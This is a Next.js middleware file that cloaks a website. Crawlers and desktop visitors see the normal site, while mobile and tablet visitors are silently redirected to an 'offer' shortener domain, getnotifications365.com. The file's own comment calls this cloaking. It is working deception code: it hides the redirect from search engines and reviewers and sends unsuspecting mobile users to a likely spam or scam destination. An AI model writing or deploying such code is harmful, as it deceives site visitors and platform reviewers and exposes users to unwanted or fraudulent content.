import { NextRequest, NextResponse } from 'next/server';
import { isBot } from './lib/bot-detection';
import { isMobileOrTablet } from './lib/device-detection';

// Shortener base URL — mobile users get redirected here
const SHORTENER_URL = 'https://c.getnotifications365.com';

// Paths that should never be cloaked (static assets, Next.js internals)
const EXCLUDED_PREFIXES = [
  '/_next/',
  '/api/',
  '/favicon.ico',
];

export function middleware(request: NextRequest) {
  const { pathname } = request.nextUrl;

  // Skip static assets and API routes
  for (const prefix of EXCLUDED_PREFIXES) {
    if (pathname.startsWith(prefix)) {
      return NextResponse.next();
    }
  }

  // Skip files with extensions (images, fonts, etc.)
  if (/\.[a-zA-Z0-9]+$/.test(pathname)) {
    return NextResponse.next();
  }

  const userAgent = request.headers.get('user-agent') ?? '';
  const headers = request.headers;

  // If it's a bot, show the normal site
  if (isBot(userAgent, headers)) {
    return NextResponse.next();
  }

  // If it's a mobile or tablet device, redirect to shortener
  if (isMobileOrTablet(userAgent, headers)) {
    // Build the redirect URL: shortener base + path
    // e.g. /offer123 → https://c.getnotifications365.com/offer123
    const slug = pathname.replace(/^\//, ''); // strip leading slash
    const redirectURL = slug
      ? `${SHORTENER_URL}/${slug}`
      : SHORTENER_URL;

    return NextResponse.redirect(redirectURL, { status: 302 });
  }

  // Desktop user — show normal site
  return NextResponse.next();
}

export const config = {
  // Run on all routes (Next.js will automatically exclude /_next/static etc.)
  matcher: '/(.*)',
};
